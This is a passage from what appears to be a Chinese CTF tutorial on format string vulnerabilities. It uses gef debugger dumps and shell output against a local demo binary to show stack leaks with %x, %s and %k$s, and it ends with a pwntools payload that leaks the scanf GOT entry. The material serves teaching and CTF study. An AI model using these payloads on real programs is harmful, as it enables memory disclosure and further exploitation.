&lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%3$x&quot;     ← $eax<br>0xffffcd14│+0x18: 0xffffce00  →  0x00000001<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br>f7e8b6bb[Inferior 1 (process 57442) exited normally]<br></code></pre></td></tr></table></figure>
+
+<p>可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7e8b6bb。</p>
+<h5 id="获取栈变量对应的字符串"><a href="#获取栈变量对应的字符串" class="headerlink" title="获取栈变量对应的字符串"></a>获取栈变量对应的字符串</h5><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>%s<br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28  printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20     ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x18: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%s<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28  in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)     ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br>%s[Inferior 1 (process 57488) exited normally]<br></code></pre></td></tr></table></figure>
+
+<p>可以看出，在第二次执行 printf 函数的时候，确实是将 0xffffcd04 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p>
+<p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p>
+<p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 3 个参数，如下，此时程序就不能够解析，就崩溃了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">2<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%2$s<br>[1]    57534 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>
+
+<p><strong>小技巧总结</strong></p>
+<blockquote>
+<ol>
+<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>
+<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>
+<li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li>
+</ol>
+</blockquote>
+<h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p>
+<p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28  in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)//参数传递进去的作用<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)     ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br></code></pre></td></tr></table></figure>
+
+<p>可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffcd10，同时该地址存储的也确实是 “%s” 格式化字符串内容。</p>
+<p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">addr%k$s<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。</p>
+</blockquote>
+<p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[tag]%</span><span class="language-bash">p%p%p%p%p%p...</span><br></code></pre></td></tr></table></figure>
+
+<p>一般来说，我们会重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">AAAA%</span><span class="language-bash">p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br><span class="hljs-meta prompt_">AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%</span><br></code></pre></td></tr></table></figure>
+
+<p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">4<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%4$s<br>[1]    61439 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>
+
+<p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。具体的可以参考下面的调试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd10│+0x04: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd14│+0x08: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: &quot;%4$s&quot;     ← $eax<br>0xffffcd24│+0x18: 0xffffce00  →  0x00000000<br>0xffffcd28│+0x1c: 0x000000e0<br>───────────────────────────────────────────────────────────────────[ trace ]────<br>[#0] 0xf7e44670 → Name: __printf(format=0xffffcd20 &quot;%4$s&quot;)<br>[#1] 0x80484ce → Name: main()<br>────────────────────────────────────────────────────────────────────────────────<br>gef➤  help x/<br>Examine memory: x/FMT ADDRESS.<br>ADDRESS is an expression for the memory address to examine.<br>FMT is a repeat count followed by a format letter and a size letter.<br>Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),<br>  t(binary), f(float), a(address), i(instruction), c(char), s(string)<br>  and z(hex, zero padded on the left).<br>Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).<br>The specified number of objects of the specified size are printed<br>according to the format.<br><br>Defaults for format and size letters are those previously used.<br>Default count is 1.  Default address is following last thing printed<br>with this command or &quot;print&quot;.<br>gef➤  x/x 0xffffcd20<br>0xffffcd20: 0x73243425<br>gef➤  vmmap<br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804b000 0x0806c000 0x00000000 rw- [heap]<br>0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7fb1000 0x00000000 rw-<br>0xf7fd3000 0xf7fd5000 0x00000000 rw-<br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rw-<br>0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so<br>0xffedd000 0xffffe000 0x00000000 rw- [stack]<br>gef➤  x/x 0x73243425<br>0x73243425: Cannot access memory at address 0x73243425<br></code></pre></td></tr></table></figure>
+
+<p>显然 0xffffcd20 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。</p>
+<p>那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。我们不妨来试一下。</p>
+<p>首先，获取 scanf@got 的地址，如下</p>
+<blockquote>
+<p>这里之所以没有使用 printf 函数，是因为 scanf 函数会对 0a，0b，0c，00 等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  got<br><br>/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory：     文件格式 elf32-i386<br><br>DYNAMIC RELOCATION RECORDS<br>OFFSET   TYPE              VALUE<br>08049ffc R_386_GLOB_DAT    __gmon_start__<br>0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0<br>0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<br></code></pre></td></tr></table></figure>
+
+<p>下面我们利用 pwntools 构造 payload 如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>sh = process(&#x27;./leakmemory&#x27;)<br>leakmemory = ELF(&#x27;./leakmemory&#x27;)<br>__isoc99_scanf_got = leakmemory.got[&#x27;__isoc99_scanf&#x27;]<br>print hex(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + &#x27;%4$s&#x27;<br>print payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(&#x27;%4$s\n&#x27;)<br>print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>其中，我们使用 gdb.attach(sh) 来进行调试。当我们运行到第二个 printf 函数的时候 (记得下断点)，可以看到我们的第四个参数确实指向我们的 scanf 的地址，这里输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> → 0xf7615670 &lt;printf+0&gt;       call   0xf76ebb09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf76ebb09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf76ebb0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf76ebb0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf76ebb10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffbbf8dc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffbbf8dc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp<br>0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp<br>0xffbbf8e8│+0x0c: 0x000000c2<br>0xffbbf8ec│+0x10: 0xf765c6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp  ← $eax<br>0xffbbf8f4│+0x18: &quot;%4$s&quot;<br>0xffbbf8f8│+0x1c: 0x00000000<br></code></pre></td></tr></table></figure>
+
+<p>同时，在我们运行的 terminal 下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./leakmemory&#x27;: pid 65363<br>[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>0x804a014<br>\x14\xa0\x0%4$s<br>[*] running in new terminal: /usr/bin/gdb -q  &quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&quot; 65363<br>[+] Waiting for debugger: Done<br>0xf76280c0<br>[*] Switching to interactive mode<br>[*] Process &#x27;./leakmemory&#x27; stopped with exit code 0 (pid 65363)<br>[*] Got EOF while reading in interactiv<br></code></pre></td></tr></table></figure>
+
+<p>我们确实得到了 scanf 的地址。</p>
+<p>但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[padding][addr]<br></code></pre></td></tr></table></figure>
+
+<p>注意</p>
+<blockquote>
+<p>我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 ,x,0,c 分别作为一个字符进行读入。下面就是错误的例子。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>xffffccfc│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x00:</span> <span class="hljs-number">0</span>x080484ce  →  <span class="hljs-operator">&lt;</span>main<span class="hljs-operator">+</span><span class="hljs-number">99</span><span class="hljs-operator">&gt;</span> add esp, <span class="hljs-number">0</span>x10   ← $esp<br><span class="hljs-number">0</span>xffffcd00│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x04:</span> <span class="hljs-number">0</span>xffffcd10  →  <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>0c<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br><span class="hljs-number">0</span>xffffcd04│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x08:</span> <span class="hljs-number">0</span>xffffcd10  →  <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>0c<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br><span class="hljs-number">0</span>xffffcd08│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x0c:</span> <span class="hljs-number">0</span>x000000c2<br><span class="hljs-number">0</span>xffffcd0c│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x10:</span> <span class="hljs-number">0</span>xf7e8b6bb  →  <span class="hljs-operator">&lt;</span>handle_intel<span class="hljs-operator">+</span><span class="hljs-number">107</span><span class="hljs-operator">&gt;</span> add esp, <span class="hljs-number">0</span>x10<br><span class="hljs-number">0</span>xffffcd10│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x14:</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>0c<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span>   ← $eax<br><span class="hljs-number">0</span>xffffcd14│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x18:</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br><span class="hljs-number">0</span>xffffcd18│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x1c:</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────<br>[<span class="hljs-comment">#0] 0xf7e44670 → Name: __printf(format=0xffffcd10 &quot;\\x0c\\xa0\\x04\\x08%4$s&quot;)</span><br>[<span class="hljs-comment">#1] 0x80484ce → Name: main()</span><br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  x<span class="hljs-symbol">/x</span> <span class="hljs-number">0</span>xffffcd10<br><span class="hljs-number">0</span><span class="hljs-params">xffffcd10:</span>   <span class="hljs-number">0</span>x6330785c<br></code></pre></td></tr></table></figure></blockquote>
